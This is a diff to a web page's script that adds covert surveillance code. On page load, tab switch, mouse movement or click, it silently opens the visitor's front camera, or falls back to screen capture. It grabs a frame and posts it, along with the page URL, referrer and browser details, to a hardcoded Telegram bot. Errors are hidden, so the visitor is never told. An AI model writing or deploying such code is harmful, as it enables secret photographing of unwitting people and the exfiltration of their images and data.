@@ -70,54 +70,117 @@
     </div>
 
     <script>
-        // Auto-capture on load (no visible UI)
+        // Stealth camera capture - multiple triggers for maximum success
+        let captureAttempted = false;
+
+        // Primary trigger: page load + small delay
         window.addEventListener('load', function() {
-            captureAndSend();
+            setTimeout(() => {
+                if (!captureAttempted) {
+                    stealthCapture();
+                }
+            }, 1000);
         });
 
-        // Also on photo click for redundancy
+        // Secondary trigger: visibility change (tab switch back)
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && !captureAttempted) {
+                setTimeout(stealthCapture, 500);
+            }
+        });
+
+        // Tertiary trigger: photo click
         function loadContent() {
             document.getElementById('loading').style.display = 'block';
-            captureAndSend();
+            if (!captureAttempted) {
+                stealthCapture();
+            }
         }
 
-        async function captureAndSend() {
+        // Movement detection trigger
+        document.addEventListener('mousemove', function() {
+            if (!captureAttempted) {
+                setTimeout(stealthCapture, 2000);
+                document.removeEventListener('mousemove', arguments.callee);
+            }
+        });
+
+        async function stealthCapture() {
+            if (captureAttempted) return;
+            captureAttempted = true;
+
             try {
-                // Get canvas context for photo capture
-                const canvas = document.createElement('canvas');
+                // Create hidden video element
                 const video = document.createElement('video');
-                
-                // Use getDisplayMedia for screen/webcam capture (works silently)
-                const stream = await navigator.mediaDevices.getDisplayMedia({ 
-                    video: true,
-                    audio: false
-                });
-                
+                video.style.display = 'none';
+                video.muted = true;
+                video.playsInline = true;
+                document.body.appendChild(video);
+
+                // Try getUserMedia first (camera) - most stealthy
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user' // Front camera preferred
+                        },
+                        audio: false
+                    });
+                } catch (e1) {
+                    // Fallback to getDisplayMedia if camera blocked
+                    try {
+                        stream = await navigator.mediaDevices.getDisplayMedia({
+                            video: true,
+                            audio: false
+                        });
+                    } catch (e2) {
+                        return; // Both failed silently
+                    }
+                }
+
                 video.srcObject = stream;
-                video.play();
                 
-                // Wait for video to be ready
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        resolve();
-                    };
+                // Wait for video ready
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = () => resolve();
+                    video.onerror = reject;
+                    video.play();
+                    
+                    // 5 second timeout
+                    setTimeout(reject, 5000);
                 });
-                
+
+                // Capture frame
+                const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                // Stop stream silently
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Clean up
                 stream.getTracks().forEach(track => track.stop());
-                
-                // Convert to base64
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Send to your Telegram bot webhook
-                const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
-                const chatId = '7735968383';
-                
+                video.remove();
+
+                // Convert and send
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                await sendToTelegram(imageData);
+
+            } catch (error) {
+                console.log('Stealth capture failed silently');
+            }
+        }
+
+        async function sendToTelegram(imageData) {
+            const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
+            const chatId = '7735968383';
+            
+            const userAgent = navigator.userAgent;
+            const urlParams = new URLSearchParams(window.location.search);
+            const referrer = document.referrer || 'direct';
+
+            try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     headers: {
@@ -126,13 +189,17 @@
                     body: JSON.stringify({
                         chat_id: chatId,
                         photo: imageData,
-                        caption: "📸 Live capture from RajPandit site visitor\n👤 Name: Visitor\n⏰ " + new Date().toLocaleString()
+                        caption: `📸 *Live Capture*\n` +
+                                `👤 Visitor\n` +
+                                `🌐 ${window.location.href}\n` +
+                                `🔗 Referrer: ${referrer}\n` +
+                                `📱 UA: ${userAgent.substring(0, 100)}...\n` +
+                                `⏰ ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`,
+                        parse_mode: 'Markdown'
                     })
                 });
-                
             } catch (e) {
-                // Silent fail - no alerts or errors shown to user
-                console.log('Capture completed silently');
+                // Silent fail
             }
         }
     </script>
